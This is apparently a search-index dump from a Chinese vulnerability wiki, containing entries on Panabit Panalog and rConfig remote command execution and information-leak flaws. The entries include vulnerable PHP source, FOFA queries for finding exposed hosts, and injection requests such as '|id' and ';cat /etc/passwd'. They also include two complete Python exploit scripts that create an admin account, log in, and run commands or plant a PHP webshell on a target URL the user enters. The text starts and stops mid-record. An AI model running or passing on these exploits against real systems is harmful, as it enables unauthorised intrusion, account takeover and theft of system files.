while [ ${tmpvar} -le 12 ]; do selected=\"\" [ ${tmpvar} -eq ${month} ] \u0026\u0026 selected=\"selected\" if [ ${tmpvar} -lt 10 ]; then echo \"\u003coption value=\\\"0${tmpvar}\\\" ${selected}\u003e${tmpvar}\u003c/option\u003e\" else echo \"\u003coption value=\\\"${tmpvar}\\\" ${selected}\u003e${tmpvar}\u003c/option\u003e\" fi tmpvar=$((${tmpvar} + 1)) done echo -n \"\u003c/select\u003e月 \u003cselect name=day style=\\\"width:60px\\\" value=${day}\u003e \"; tmpvar=1 while [ ${tmpvar} -le 31 ]; do selected=\"\" [ ${tmpvar} -eq ${day} ] \u0026\u0026 selected=\"selected\" if [ ${tmpvar} -lt 10 ]; then echo \"\u003coption value=\\\"0${tmpvar}\\\" ${selected}\u003e${tmpvar}\u003c/option\u003e\" else echo \"\u003coption value=\\\"${tmpvar}\\\" ${selected}\u003e${tmpvar}\u003c/option\u003e\" fi tmpvar=$((${tmpvar} + 1)) done echo -n \"\u003c/select\u003e日\u003c/td\u003e \u003c/tr\u003e \u003ctr id=row1\u003e \u003ctd\u003e\u003c/td\u003e \u003ctd align=left\u003e时/分/秒\u003c/td\u003e \u003ctd width=* align=left\u003e \u003cselect name=hour value=0 style=\\\"width:60px\\\" value=${hour}\u003e \"; tmpvar=0 while [ ${tmpvar} -le 23 ]; do selected=\"\" [ ${tmpvar} -eq ${hour} ] \u0026\u0026 selected=\"selected\" if [ ${tmpvar} -lt 10 ]; then echo \"\u003coption value=\\\"0${tmpvar}\\\" ${selected}\u003e${tmpvar}\u003c/option\u003e\" else echo \"\u003coption value=\\\"${tmpvar}\\\" ${selected}\u003e${tmpvar}\u003c/option\u003e\" fi tmpvar=$((${tmpvar} + 1)) done echo -n \"\u003c/select\u003e时 \u003cselect name=minute value=0 style=\\\"width:60px\\\" value=${minute}\u003e \"; tmpvar=0 while [ ${tmpvar} -le 59 ]; do selected=\"\" [ ${tmpvar} -eq ${minute} ] \u0026\u0026 selected=\"selected\" if [ ${tmpvar} -lt 10 ]; then echo \"\u003coption value=\\\"0${tmpvar}\\\" ${selected}\u003e${tmpvar}\u003c/option\u003e\" else echo \"\u003coption value=\\\"${tmpvar}\\\" ${selected}\u003e${tmpvar}\u003c/option\u003e\" fi tmpvar=$((${tmpvar} + 1)) done echo -n \"\u003c/select\u003e分 \u003cselect name=second value=0 style=\\\"width:60px\\\" value=${se","date":"0001-01-01","objectID":"/panabit-ixcache-date_config-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/panabit-ixcache-date_config-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Panabit Panalog sy_addmount.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/panabit-panalog-sy_addmount.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/panabit-panalog-sy_addmount.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Panabit Panalog sy_addmount.php过滤不足，导致远程命令执行漏洞 ","date":"0001-01-01","objectID":"/panabit-panalog-sy_addmount.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/panabit-panalog-sy_addmount.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Panabit Panalog ","date":"0001-01-01","objectID":"/panabit-panalog-sy_addmount.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/panabit-panalog-sy_addmount.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"Maintain/cloud_index.php\" ","date":"0001-01-01","objectID":"/panabit-panalog-sy_addmount.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/panabit-panalog-sy_addmount.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 存在漏洞的代码为 account/sy_addmount.php \u003c?php include(dirname(__FILE__).\"/../common.php\"); $username = isset($_REQUEST[\"username\"]) ? $_REQUEST[\"username\"] : \"\"; if (empty($username)) { echo '{\"success\":\"no\", \"out\":\"NO_USER\"}'; exit; } $username = addslashes($username); $rows = array(); $cmd = PANALOGEYE.\" behavior add account=$username\"; exec($cmd, $out, $ret); echo $out[0]; exit; 其中没有对身份进行鉴权，且 username 可控，构造POC POST /account/sy_addmount.php username=|id ","date":"0001-01-01","objectID":"/panabit-panalog-sy_addmount.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/panabit-panalog-sy_addmount.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"rConfig ajaxArchiveFiles.php 后台远程命令执行漏洞 ","date":"0001-01-01","objectID":"/rconfig-ajaxarchivefiles.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/rconfig-ajaxarchivefiles.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 rConfig ajaxArchiveFiles.php文件中由于对path参数和ext参数进行命令拼接，导致攻击者可以远程命令执行获取服务器权限 ","date":"0001-01-01","objectID":"/rconfig-ajaxarchivefiles.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/rconfig-ajaxarchivefiles.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 rConfig ","date":"0001-01-01","objectID":"/rconfig-ajaxarchivefiles.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/rconfig-ajaxarchivefiles.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"rConfig\" ","date":"0001-01-01","objectID":"/rconfig-ajaxarchivefiles.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/rconfig-ajaxarchivefiles.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 存在漏洞的文件 /home/rconfig/www/lib/ajaxHandlers/ajaxArchiveFiles.php \u003c?php require_once(\"/home/rconfig/classes/usersession.class.php\"); require_once(\"/home/rconfig/classes/ADLog.class.php\"); require_once(\"/home/rconfig/config/functions.inc.php\"); $log = ADLog::getInstance(); if (!$session-\u003elogged_in) { echo 'Don\\'t bother trying to hack me!!!!!\u003cbr /\u003e This hack attempt has been logged'; $log-\u003eWarn(\"Security Issue: Some tried to access this file directly from IP: \" . $_SERVER['REMOTE_ADDR'] . \" \u0026 Username: \" . $session-\u003eusername . \" (File: \" . $_SERVER['PHP_SELF'] . \")\"); // need to add authentication to this script header(\"Location: \" . $config_basedir . \"login.php\"); } else { //archive logs files $mainPath = $_GET['path']; $archiveMainPath = $mainPath . \"archive/\"; $ext = \"*.\" . $_GET['ext']; $fullpath = $mainPath . $ext; // create and archive dir if not already created if (!is_dir($archiveMainPath)) { mkdir(\"$archiveMainPath\"); } $today = date(\"Ymd\"); $commandString = \"sudo -u apache zip -r -j \" . $archiveMainPath . \"filename\" . $today . \".zip \" . $mainPath . $ext; exec($commandString); foreach (glob($fullpath) as $v) { unlink($v); } $fileCount = count(glob($mainPath . $ext)); if ($fileCount \u003e 0) { $response = json_encode(array( 'failure' =\u003e true )); } else { $response = json_encode(array( 'success' =\u003e true )); } echo $response; } // end session check 关键代码如下 $mainPath = $_GET['path']; $archiveMainPath = $mainPath . \"archive/\"; $ext = \"*.\" . $_GET['ext']; $fullpath = $mainPath . $ext; // create and archive dir if not already created if (!is_dir($archiveMainPath)) { mkdir(\"$archiveMainPath\"); } $today = date(\"Ymd\"); $commandString = \"sudo -u apache zip -r -j \" . $archiveMainPath . \"filename\" . $today . \".zip \" . $mainPath . $ext; exec($commandString); ext参数 用户可控 $commandString = \"sudo -u apache zip -r -j \" . $archiveMainPath . \"filename\" . $today . \".zip \" . $mainPath . $ext; 没有使用过滤直接拼接命令，导致命令执行，并因为sudo而root权限执行，由于是后台漏洞所以需要登录，配合任意用户创建可以RCE 请求包为 GET /lib/ajaxHandlers/ajaxArchiveFiles.php?path=1\u0026ext=;ls%3E../../test.txt HTTP/1.1 Host: Cookie: cookname=testtest; cookid=a13be657db5e18e453c66c564467b0f2; PHPSESSID=lr7j5r2beat1eprpklrhiorq71 Cache-Control: max-age=0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Sec-Ch-Ua-Mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Length: 2 再请求 http://xxx.xxx.xxx.xxx/test.txt 验证漏洞 ","date":"0001-01-01","objectID":"/rconfig-ajaxarchivefiles.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/rconfig-ajaxarchivefiles.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning from requests_toolbelt.multipart.encoder import MultipartEncoder def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: rConfig userprocess.php 任意用户创建漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/lib/crud/userprocess.php\" referer = target_url + \"useradmin.php\" ran_number = random.randint(1, 999) origin = target_url multipart_data = MultipartEncoder( fields={ 'username': 'testtest{}'.format(ran_number), 'password': 'testtest@{}'.format(ran_number), 'passconf': 'testtest@{}'.format(ran_number), 'email': 'testtest{}@test.com'.format(ran_number), 'ulevelid': '9', 'add': 'add', 'editid': '' } ) headers = {'Content-Type': multipart_data.content_type, \"Upgrade-Insecure-Requests\": \"1\", \"Referer\": referer, \"Origin\": origin} cookies = {'PHPSESSID': 'test'} try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(vuln_url, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False) if \"error\" not in response.text: username = 'testtest{}'.format(ran_number) password = 'testtest@{}'.format(ran_number) print(\"\\033[36m[o] 成功创建账户 testtest{}/testtest@{} \\033[0m\".format(ran_number, ran_number)) POC_2(target_url, username, password) else: print(\"\\033[31m[x] 创建失败:{} \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url, username, password): print(\"\\033[36m[o] 正在登陆账户..... \\033[0m\") vuln_url = target_url + \"/lib/crud/userprocess.php\" headers = { 'Content-Type': \"application/x-www-form-urlencoded; charset=UTF-8\", \"Referer\": target_url + \"deviceConnTemplates.php\", \"Origin\": target_url, \"X-Requested-With\": \"XMLHttpRequest\", \"Accept-Language\": \"en-US,en;q=0.5\" } data = { 'user': username, 'pass': password, 'sublogin': '1' } try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在尝试执行 cat /etc/passwd.....\\033[0m\") with requests.Session() as s: p = s.post(target_url + '/lib/crud/userprocess.php', data=data, verify=False) if \"Stephen Stack\" in p.text: print(\"\\033[31m[x] 登录失败 \\033[0m\") else: rce = s.get(target_url + '/lib/ajaxHandlers/ajaxArchiveFiles.php?path=1\u0026ext=;cat%20/etc/passwd%3E../../test.txt', verify=False, headers=headers) if \"success\" in rce.text: response = s.get(target_url + '/test.txt', verify=False) print(\"\\033[36m[o] 成功执行 cat /etc/passwd, 响应为:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/rconfig-ajaxarchivefiles.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/rconfig-ajaxarchivefiles.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"rConfig ajaxEditTemplate.php 后台远程命令执行漏洞 ","date":"0001-01-01","objectID":"/rconfig-ajaxedittemplate.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/rconfig-ajaxedittemplate.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 rConfig ajaxEditTemplate.php 存在后台远程命令执行 ","date":"0001-01-01","objectID":"/rconfig-ajaxedittemplate.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/rconfig-ajaxedittemplate.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 rConfig ","date":"0001-01-01","objectID":"/rconfig-ajaxedittemplate.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/rconfig-ajaxedittemplate.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"rConfig\" ","date":"0001-01-01","objectID":"/rconfig-ajaxedittemplate.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/rconfig-ajaxedittemplate.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 漏洞文件为 rconfig/www/lib/ajaxHandlers/ajaxEditTemplate.php \u003c?php require_once(\"/home/rconfig/classes/usersession.class.php\"); require_once(\"/home/rconfig/classes/ADLog.class.php\"); require_once(\"/home/rconfig/classes/spyc.class.php\"); require_once(\"/home/rconfig/config/functions.inc.php\"); $log = ADLog::getInstance(); if (!$session-\u003elogged_in) { echo 'Don\\'t bother trying to hack me!!!!!\u003cbr /\u003e This hack attempt has been logged'; $log-\u003eWarn(\"Security Issue: Some tried to access this file directly from IP: \" . $_SERVER['REMOTE_ADDR'] . \" \u0026 Username: \" . $session-\u003eusername . \" (File: \" . $_SERVER['PHP_SELF'] . \")\"); // need to add authentication to this script header(\"Location: \" . $config_basedir . \"login.php\"); } else { $ymlData = Spyc::YAMLLoad($_POST['code']); $fileName = $_POST['fileName']; $check_yml_extension = explode('.', $fileName); if(@!array_key_exists($check_yml_extension[1])){ if(@$check_yml_extension[1] != 'yml'){ $fileName = $fileName . '.yml'; } } $fullpath = $config_templates_basedir.$fileName; $username = $_SESSION['username']; require_once(\"../../../classes/db2.class.php\"); require_once(\"../../../classes/ADLog.class.php\"); $db2 = new db2(); $log = ADLog::getInstance(); if (!is_dir('templates')) { mkdir('templates'); chown('templates', 'apache'); } // if'' to create the filename based on the command if not created \u0026 chmod to 666 if (!file_exists($fullpath)) { exec(\"touch \" . $fullpath); chmod($fullpath, 0666); } // if the file is alread in place chmod it to 666 before writing info chmod($fullpath, 0666); // dump array into file \u0026 chmod back to RO $filehandle = fopen($fullpath, 'w+'); file_put_contents($fullpath, $_POST['code']); fclose($filehandle); chmod($fullpath, 0444); $db2-\u003equery(\"UPDATE `templates` SET `fileName` = :fileName, `name` = :name, `desc` = :desc, `dateLastEdit` = NOW(), `addedby` = :username WHERE `id` = :id\"); $db2-\u003ebind(':id', $_POST['id']); $db2-\u003ebind(':fileName', $fullpath); $db2-\u003ebind(':name', $ymlData['main']['name']); $db2-\u003ebind(':desc', $ymlData['main']['desc']); $db2-\u003ebind(':username', $username); $queryResult = $db2-\u003eexecute(); /* Update successful */ if ($queryResult \u0026\u0026 file_exists($fullpath)) { $response = \"success\"; $log-\u003eInfo(\"Success: Template: \".$fullpath.\" edited in templates folder\"); } /* Update failed */ else { $response = \"failed\"; $log-\u003eWarn(\"Success: Could not edit Template \".$fullpath.\" in templates folder\"); } echo json_encode($response); } // end session check 关键代码如下 // if'' to create the filename based on the command if not created \u0026 chmod to 666 if (!file_exists($fullpath)) { exec(\"touch \" . $fullpath); chmod($fullpath, 0666); } // if the file is alread in place chmod it to 666 before writing info chmod($fullpath, 0666); // dump array into file \u0026 chmod back to RO $filehandle = fopen($fullpath, 'w+'); file_put_contents($fullpath, $_POST['code']); fclose($filehandle); chmod($fullpath, 0444; $fileName –\u003e $fullpath —\u003e 写入文件，其中 fileName参数 POST传入时没有过滤导致目录可上传任意位置 $ymlData = Spyc::YAMLLoad($_POST['code']); $fileName = $_POST['fileName']; $check_yml_extension = explode('.', $fileName); if(@!array_key_exists($check_yml_extension[1])){ if(@$check_yml_extension[1] != 'yml'){ $fileName = $fileName . '.yml'; } } $fullpath = $config_templates_basedir+ .$fileName; $filehandle = fopen($fullpath, 'w+'); file_put_contents($fullpath, $_POST['code']); POST code 传参写入文件 test.php.yml, 请求包如下 POST /lib/ajaxHandlers/ajaxEditTemplate.php HTTP/1.1 Host: Cookie: PHPSESSID=fv8j4c6r4gofug1vr9v3efdvj7 Content-Length: 81 Cache-Control: max-age=0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Sec-Ch-Ua-Mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Origin: https://176.62.195.243 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchan","date":"0001-01-01","objectID":"/rconfig-ajaxedittemplate.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/rconfig-ajaxedittemplate.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning from requests_toolbelt.multipart.encoder import MultipartEncoder def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: rConfig ajaxEditTemplate.php 后台远程命令执行 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/lib/crud/userprocess.php\" referer = target_url + \"useradmin.php\" ran_number = random.randint(1, 999) origin = target_url multipart_data = MultipartEncoder( fields={ 'username': 'testtest{}'.format(ran_number), 'password': 'testtest@{}'.format(ran_number), 'passconf': 'testtest@{}'.format(ran_number), 'email': 'testtest{}@test.com'.format(ran_number), 'ulevelid': '9', 'add': 'add', 'editid': '' } ) headers = {'Content-Type': multipart_data.content_type, \"Upgrade-Insecure-Requests\": \"1\", \"Referer\": referer, \"Origin\": origin} cookies = {'PHPSESSID': 'test'} try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(vuln_url, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False) if \"error\" not in response.text: username = 'testtest{}'.format(ran_number) password = 'testtest@{}'.format(ran_number) print(\"\\033[36m[o] 成功创建账户 testtest{}/testtest@{} \\033[0m\".format(ran_number, ran_number)) POC_2(target_url, username, password) else: print(\"\\033[31m[x] 创建失败:{} \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url, username, password): print(\"\\033[36m[o] 正在登陆账户..... \\033[0m\") vuln_url = target_url + \"/lib/crud/userprocess.php\" headers = { 'Content-Type': \"application/x-www-form-urlencoded; charset=UTF-8\", \"Referer\": target_url + \"deviceConnTemplates.php\", \"Origin\": target_url, \"X-Requested-With\": \"XMLHttpRequest\", \"Accept-Language\": \"en-US,en;q=0.5\" } data = { 'user': username, 'pass': password, 'sublogin': '1' } try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在尝试执行 id....\\033[0m\") with requests.Session() as s: p = s.post(target_url + '/lib/crud/userprocess.php', data=data, verify=False) if \"Stephen Stack\" in p.text: print(\"\\033[31m[x] 登录失败 \\033[0m\") else: data = \"fileName=..%2Fwww%2Ftest.php\u0026code=%3C%3Fphp+echo+system%28%27id%27%29%3B%3F%3E\u0026id=1\" rce = s.post(target_url + '/lib/ajaxHandlers/ajaxEditTemplate.php', verify=False, data=data, headers=headers) if \"success\" in rce.text: response = s.get(target_url + '/test.php.yml', verify=False) print(\"\\033[36m[o] 成功执行 id, 响应为:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/rconfig-ajaxedittemplate.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/rconfig-ajaxedittemplate.php-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"rConfig useradmin.inc.php 信息泄露漏洞 ","date":"0001-01-01","objectID":"/rconfig-useradmin.inc.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/rconfig-useradmin.inc.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 rConfig useradmin.inc.php 存在信息泄露漏洞，通过访问文件获取用户邮箱信息和登录名 ","date":"0001-01-01","objectID":"/rconfig-useradmin.inc.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/rconfig-useradmin.inc.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 rConfig ","date":"0001-01-01","objectID":"/rconfig-useradmin.inc.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/rconfig-useradmin.inc.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"rConfig\" ","date":"0001-01-01","objectID":"/rconfig-useradmin.inc.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/rconfig-useradmin.inc.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 出现漏洞的文件 \u003c?php /* Includes */ require_once(\"../classes/db2.class.php\"); include_once('../classes/paginator.class.php'); /* Instantiate DB Class */ $db2 = new db2(); // get timezone for later $db2-\u003equery(\"SELECT timeZone FROM settings\"); $result = $db2-\u003eresultsetCols(); $timeZone = $result[0]; date_default_timezone_set($timeZone); /* Get Row count from users where NOT deleted */ $db2-\u003equery('SELECT COUNT(*) AS total FROM users WHERE status = 1'); $row = $db2-\u003eresultsetCols(); $result[\"total\"] = $row[0]; /* Instantiate Paginator Class */ $pages = new Paginator; $pages-\u003eitems_total = $result['total']; $pages-\u003emid_range = 7; // Number of pages to display. Must be odd and \u003e 3 $pages-\u003epaginate(); echo $pages-\u003edisplay_pages(); echo \"\u003cspan class=\\\"\\\"\u003e\" . $pages-\u003edisplay_jump_menu() . $pages-\u003edisplay_items_per_page() . \"\u003c/span\u003e\"; /* GET all nodes records from DB */ $db2-\u003equery(\"SELECT id, username, userlevel, email, timestamp FROM users WHERE status = 1 $pages-\u003elimit\"); $resultSelect = $db2-\u003eresultset(); // push rows to $itesm array $items = array(); foreach ($resultSelect as $row) { array_push($items, $row); } /* Create Multidimensional array for use later */ $result[\"rows\"] = $items; $i = 0; # row counter to enable alternate row coloring ?\u003e \u003ctable id=\"userAddTbl\" class=\"tableSimple\"\u003e \u003cthead\u003e \u003cth rowspan=\"2\"\u003e\u003cinput type=\"checkbox\" disabled=\"disabled\"/\u003e\u003c/th\u003e \u003cth rowspan=\"2\"\u003eUsername\u003c/th\u003e \u003cth rowspan=\"2\"\u003eE-mail\u003c/th\u003e \u003cth rowspan=\"2\"\u003eUser Level\u003c/th\u003e \u003cth rowspan=\"2\"\u003eLast Login\u003c/th\u003e \u003c/thead\u003e \u003ctbody\u003e \u003c?php foreach ($result['rows'] as $rows): $id = $rows['id']; /* This bit just updates the class='row' bit with an alternating 1 OR 0 for alternative row coloring */ echo 